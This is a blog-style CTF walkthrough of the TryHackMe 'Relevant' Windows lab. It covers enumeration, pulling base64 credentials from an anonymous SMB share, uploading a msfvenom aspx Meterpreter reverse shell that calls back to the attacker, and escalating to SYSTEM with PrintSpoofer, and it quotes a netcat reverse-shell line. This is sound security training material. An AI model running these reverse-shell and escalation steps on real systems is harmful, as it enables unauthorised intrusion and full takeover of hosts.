---
title: "[CTF] Tryhackme - Relevant"
date: 2025-02-03 12:00:00 -500 
categories: [CTF - Tryhackme, Relevant]
tags: [ctf,exploit,flags,tryhackme,pentesting,]
author: Christoph K
---
[TryHackMe- Relevant ](https://tryhackme.com/room/relevant)



## Tasks and Intruction

- user flag 
- root flag


        Scope of Work
        The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:


        Additionally, the client has provided the following scope allowances:

        Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
        Locate and note all vulnerabilities found
        Submit the flags discovered to the dashboard
        Only the IP address assigned to your machine is in scope
        Find and report ALL vulnerabilities (yes, there is more than one path to root)
        (Roleplay off)

        I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
        Note - Nothing in this room requires Metasploit

        Machine may take up to 5 minutes for all services to start.



## Important Notice in advance

I really recommend to do this room on your own and just check Write-Ups if really neccessary. This room provides several vulnerabilities and possibilities and it seems a really good lab for practising for `OSCP`


I spent a lot of time for solving this one! A LOT OF TIME!!! :-) 



### Portscan

First we start again with a portscan. I used `rustscan` and transmitted the results over to `nmap`.

As you can see, we have several open ports here.

```bash
80/tcp    open  http           syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server

139/tcp   open  netbios-ssn    syn-ack Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds   syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp  open  ms-wbt-server? syn-ack
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-31T10:29:01
| Not valid after:  2025-08-02T10:29:01
| MD5:   e3ed:522a:9acb:a9a2:89c6:8f8d:92ea:ce52
| SHA-1: 14c4:2f77:4783:250c:4392:8831:d4cf:a611:a921:a735
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQTpEKUZR5bLZBT7+YJZlCATANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNTAxMzExMDI5MDFaFw0yNTA4MDIxMDI5
| MDFaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEA0R/szS+QdwbMi9KCsKZ304fAbPX3TI8398+pzlh/dvWtGRiKjHBG
| UchLh/syBKlnxrYDw2I1q3Q2dIVmvWBn2r2SV34/xav6Zr88TgegzmjnBbuIFSKg
| ky/EesId9yEAcFX/UO4UAYfMSRvHzstPY10UrZfXLYf6M9eBXsBWeIxlvZSZ59xX
| YxdhO16BBC4sfmOaSyMoFV1yuVBxy6mC8klcLoZUcWJflmXgshNcTLZlnmVb2ZRB
| aTgAA+kqda4u0i/9xa0eastcLpRCvFAnXlbvIDAWCAZ3V50J5hKeTgdgp7jbK9rU
| mBq7C3ygZZC3eYaVOp3DoNjl6lRHG93yzwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBALr0dvWwdjvu
| Lm2K9j9ZqfkZuX1YY79NoyUUaXLEPgkaAUHFK1nO9++7MVQtjDW1bhxp4z2UvP7a
| 9AoqRB63v4YfxuTAPT6fQ7tknp1CSOZ5nOwMZODo5IlxicAz2CHjAwX6x4KjG5CT
| 1CUvtWsxzj/mkoRUYJgV3fYn7sID8vi60O/LtngoV4eTycHZda7mDKlnNewfYl8q
| 2NuUJhqH7mFji1088ifRGcKGYTkD4O5t+PKczorDYTob31pkRAbTQTlk5Yunb37H
| WKItKejy8ZPPOmxkhXgkodH9u8ezoFa0pqNgM7v5MzwFSJitBfrgRdKQKEAV9PiT
| VqUk/uvNQxY=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-02-01T10:41:44+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-01T10:41:04+00:00

49663/tcp open  http           syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

49667/tcp open  msrpc          syn-ack Microsoft Windows RPC

49669/tcp open  msrpc          syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h36m00s, deviation: 3h34m41s, median: 0s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 44407/tcp): CLEAN (Timeout)
|   Check 2 (port 7446/tcp): CLEAN (Timeout)
|   Check 3 (port 56553/udp): CLEAN (Timeout)
|   Check 4 (port 35265/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-01T02:41:07-08:00
| smb2-time:
|   date: 2025-02-01T10:41:08
|_  start_date: 2025-02-01T10:29:16
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:41
Completed NSE at 11:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.87 seconds
```
We have several ports to check. 

Lets list them here:

- 80 `http`
- 139 `netbios`
- 445 `smb`
- 3389 `rdp`
- 49663 seems like `smb`
- 49667 `rpc`
- 49669 `rpc`



## Port 80

Before checking `websites`I do a small tasklist for myself:

- Dirsearch
- vHosts Scan
- Browing website

### Dirsearch

I use `dirsearch` because it gets `99%` of the relevant pages without using `gobuster` with wordlists.

```bash
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/admin/reports/_relevant.thm/_25-02-01_11-38-50.txt

Target: http://relevant.thm/

[11:38:56] Starting:
[11:38:58] 403 -  312B  - /%2e%2e//google.com
[11:38:58] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[11:38:58] 404 -    2KB - /.ashx
[11:38:58] 404 -    2KB - /.asmx
[11:39:02] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[11:39:04] 404 -    2KB - /admin%20/
[11:39:04] 404 -    2KB - /admin.
[11:39:09] 404 -    2KB - /asset..
[11:39:11] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[11:39:17] 400 -    3KB - /docpicker/internal_proxy/https/127.0.0.1:9043/ibm/console
[11:40:19] 404 -    2KB - /index.php.
[11:40:22] 404 -    2KB - /javax.faces.resource.../
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jfrStart/filename=!/tmp!/foo
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/jvmtiAgentLoad/!/etc!/passwd
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/help/*
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/disable
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmLog/output=!/tmp!/pwned
[11:40:22] 400 -    3KB - /jolokia/exec/com.sun.management:type=DiagnosticCommand/vmSystemProperties
[11:40:22] 400 -    3KB - /jolokia/exec/java.lang:type=Memory/gc
[11:40:22] 400 -    3KB - /jolokia/read/java.lang:type=Memory/HeapMemoryUsage/used
[11:40:22] 400 -    3KB - /jolokia/read/java.lang:type=*/HeapMemoryUsage
[11:40:22] 400 -    3KB - /jolokia/search/*:j2eeType=J2EEServer,*
[11:40:22] 400 -    3KB - /jolokia/write/java.lang:type=Memory/Verbose/true
[11:40:23] 404 -    2KB - /login.wdm%2e
[11:40:28] 404 -    2KB - /rating_over.
[11:40:29] 404 -    2KB - /service.asmx
[11:40:31] 404 -    2KB - /static..
[11:40:33] 403 -    2KB - /Trace.axd
[11:40:33] 404 -    2KB - /umbraco/webservices/codeEditorSave.asmx
[11:40:34] 404 -    2KB - /WEB-INF./
[11:40:34] 404 -    2KB - /WebResource.axd?d=LER8t9aS

Task Completed
```

Unfortunately nothing interesting here.

### vHost Scan

I checked vHosts via `ffuf` which didn't find anything. 


### Browsing Website

You get a default `Windows IIS` page. Nothing here to explore



## SMB 139 / 445

### Anonymous Login

We can use `anonymous` login with `smb` to see if we can access anything:


```bash
└─$ smbclient -L 10.10.202.251 -U anonymous
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.202.251 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

As you can see, we are able to see the disk `nt4wrksv`! That could be something.

### Vulnerable SMB Version

We scanned before via `nmap`the version of the services and we have `SMBv1` here with interesting permissions:

```bash

 smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```


We are able to connect to the disk directly and get the file `passwords.txt`!

```bash

┌──(admin㉿PREDATOR-01)-[~]
└─$ nmap --script smb-vuln* -p 445 10.10.202.251
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-01 12:02 CET
Nmap scan report for relevant.thm (10.10.202.251)
Host is up (0.042s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds

┌──(admin㉿PREDATOR-01)-[~]
└─$ smbclient //10.10.202.251/nt4wrksv -U admin
Password for [WORKGROUP\admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

                7735807 blocks of size 4096. 5126177 blocks available
smb: \> get passwords.txt passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \>
```
Now we can decode those passwords.


### Cracking the encoded passwords

The `passwords.txt` file had `base64` contents which I decoded in `bash`:

```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
Bob - !P@$$W0rD!123
┌──(admin㉿PREDATOR-01)-[~]
└─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
Bill - Juw4nnaM4n420696969!$$$
┌──(admin㉿PREDATOR-01)-[~]

```

We have now following credentials: 

`Bob - !P@$$W0rD!123`

`Bill - Juw4nnaM4n420696969!$$$`

## RDP 3389

Connecting via xfreerdp and windows `mstsc` did not work. I spent a lot of time to try those credentials. It seems we have a `rabbithole` here!!

```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ xfreerdp /v:10.10.99.126 /u:Bob /p:'!P@$$W0rD!123' /sec:tls
[12:38:15:007] [14128:14129] [WARN][com.freerdp.core.nego] - Error: HYBRID_REQUIRED_BY_SERVER
[12:38:15:008] [14128:14129] [ERROR][com.freerdp.core.nego] - Protocol Security Negotiation Failure
[12:38:15:008] [14128:14129] [ERROR][com.freerdp.core] - rdp_client_connect:freerdp_set_last_error_ex ERRCONNECT_SECURITY_NEGO_CONNECT_FAILED [0x0002000C]
[12:38:15:008] [14128:14129] [ERROR][com.freerdp.core.connection] - Error: protocol security negotiation or connection failure

┌──(admin㉿PREDATOR-01)-[~]
└─$ xfreerdp /v:10.10.99.126 /u:Bob /p:'!P@$$W0rD!123' /sec:rdp
[12:38:37:089] [14198:14199] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[12:38:37:089] [14198:14199] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[12:38:37:207] [14198:14199] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[12:38:37:207] [14198:14199] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[12:38:37:207] [14198:14199] [ERROR][com.freerdp.core] - freerdp_post_connect failed

```


We have to go back to `SMB`

## Enumerate SMB 

I checked our `SMB` share again, and found out I can `upload` things there! I created a `test.txt` and uploaded it to the disk.

![image.png](assets/img/tryhackme/relevant/01.png)

- Uploading possible on the `nt4wrksv` share
- accessible via port 49663

After trying all high ports from earlier I saw, that there is also the "Welcome Page" from `Windows IIS` on port `49663`. 

So I was able to find my uploaded text file:

![test](assets/img/tryhackme/relevant/02.png)


### Creating Reverse shell payload


Lets create a reverse shell for `Windows`. I use an online tool to get `payload` and `listener`ready. 


![msfvenom](assets/img/tryhackme/relevant/03.png)


```bash
┌──(admin㉿PREDATOR-01)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.111.111 LPORT=1234 -f aspx -o reverse.aspx
Running the 'init' command for the database:
Existing database found, attempting to start it
Starting database at /home/admin/.msf4/db...pg_ctl: another server might be running; trying to start server anyway
waiting for server to start.... done
server started
success
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of aspx file: 3651 bytes
Saved as: reverse.aspx
```

Now we have to upload the created file via `SMB` and `activate` it with `curl` or website:

`http://10.10.83.151:49663/nt4wrksv/reverse.aspx`



### Connect via meterpreter

We use the `multihandler` from metasploit and have to change our settings properly:

```bash
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
payload => windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.11.111.111
lhost => 10.11.111.111
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.11.111.111:4444
[*] Meterpreter session 1 opened (10.11.111.111:4444 -> 10.10.83.151:49790) at 2025-02-04 22:11:31 +0100
```
After a minute, we got a connection!!!

Lets grab the `user flag`: 


```bash

meterpreter > ls
Listing: c:\windows\system32\inetsrv
# meterpreter > cd c:/users
meterpreter > dir
Listing: c:\users

Mode              Size  Type  Last modified              Name

---

040777/rwxrwxrwx  8192  dir   2020-07-25 17:05:52 +0200  .NET v4.5
040777/rwxrwxrwx  8192  dir   2020-07-25 17:05:49 +0200  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2020-07-25 19:30:12 +0200  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 15:34:35 +0200  All Users
040777/rwxrwxrwx  0     dir   2020-07-25 23:03:44 +0200  Bob
040555/r-xr-xr-x  0     dir   2020-07-25 19:55:45 +0200  Default
040777/rwxrwxrwx  0     dir   2016-07-16 15:34:35 +0200  Default User
040555/r-xr-xr-x  0     dir   2020-07-25 16:58:09 +0200  Public
100666/rw-rw-rw-  174   fil   2016-07-16 15:21:29 +0200  desktop.ini

# meterpreter > cd bob/desktop/
meterpreter > ls
Listing: c:\users\bob\desktop

Mode              Size  Type  Last modified              Name

---

100666/rw-rw-rw-  35    fil   2020-07-25 17:24:43 +0200  user.txt

meterpreter > cat user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```


User flag: `THM{fdk4ka34vk346ksxfr21tg789ktf45}`

## Escalate Privileges

Lets check, what we are allowed to do via `getprivs`: 

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

This is very interesting, we have `SeImpersonatePrivilege`, that could be our chance to get `SYSTEM` permissions.


### Research SeImpersonatePrivilege

I am honest, I did a lot of research here.. But I found a way to escalate our privileges...

![msfvenom](assets/img/tryhackme/relevant/04.png)

I downloaded `PrintSpooler64.exe` from the github repository and uploaded it via `SMB` again. Then I created a `shell` and tried to open a elevated Powershell session:

```bash
meterpreter > shell
Process 2800 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -h
PrintSpoofer64.exe -h

PrintSpoofer v0.1 (by @itm4n)

  Provided that the current user has the SeImpersonate privilege, this tool will leverage the Print
  Spooler service to get a SYSTEM token and then run a custom command with CreateProcessAsUser()

Arguments:
  -c <CMD>    Execute the command *CMD*
  -i          Interact with the new process in the current command prompt (default is non-interactive)
  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
  -h          That's me :)

Examples:
  - Run PowerShell as SYSTEM in the current console
      PrintSpoofer.exe -i -c powershell.exe
  - Spawn a SYSTEM command prompt on the desktop of the session 1
      PrintSpoofer.exe -d 1 -c cmd.exe
  - Get a SYSTEM reverse shell
      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"

c:\inetpub\wwwroot\nt4wrksv>
```
Important thing is, that we find our `PrintSpooler64.exe` again. 

Default Path with `IIS` is C:\inetpub\wwwroot\ and there was the SMB share as well.

Lets use it and get the `root flag`

```bash
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell.exe
PrintSpoofer64.exe -i -c powershell.exe
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
PS C:\Windows\system32> cd \users\administrator\desktop
cd \users\administrator\desktop
PS C:\users\administrator\desktop> dir
dir

    Directory: C:\users\administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/25/2020   8:25 AM             35 root.txt

PS C:\users\administrator\desktop> cat root.txt
cat root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
PS C:\users\administrator\desktop>
```

Root Flag: `THM{1fk5kf469devly1gl320zafgl345pv}`


## Thoughts

This CTF is crazy. I did a lot of CTFs now, but I really fell into a big rabbit hole here with the `base64 encoded credentials`. I thought I have to use them to get access via `rdp`.. That was a very interesting experience!! I strongly recommend this room, I learned a lot:

- Postscan  via `nmap`
- Exploiting vulnerable `SMBv1` version
- Creating `reverse shell` via `msfvenom`
- Escalated privilges via `SeImpersonatePrivilege`








